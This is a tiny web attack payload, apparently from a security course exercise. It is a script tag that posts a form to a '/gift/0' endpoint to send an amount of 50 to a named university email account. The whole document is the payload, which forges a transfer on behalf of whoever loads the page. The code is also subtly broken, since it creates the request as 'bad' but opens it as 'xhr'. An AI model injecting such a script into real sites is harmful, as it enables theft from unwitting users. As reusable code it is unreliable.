<script>
var bad = new XMLHttpRequest();
xhr.open("POST", "/gift/0", true);
var formData = new FormData();
formData.append("username", "sl4506@nyu.edu");
formData.append("amount", "50");
bad.send(formData);
</script>